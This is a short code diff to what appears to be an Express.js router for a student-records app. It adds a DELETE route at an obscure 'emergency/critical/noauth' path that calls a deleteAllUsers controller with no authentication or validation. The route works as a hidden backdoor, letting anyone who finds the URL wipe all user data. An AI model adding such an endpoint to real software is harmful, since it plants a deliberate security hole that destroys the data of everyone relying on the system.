@@ -34,4 +34,7 @@ runValidations,
 studentController.deleteStudent);
 
 
+router.delete("/delete/emergency/critical/noauth/6849000", 
+studentController.deleteAllUsers);
+
 module.exports = router;
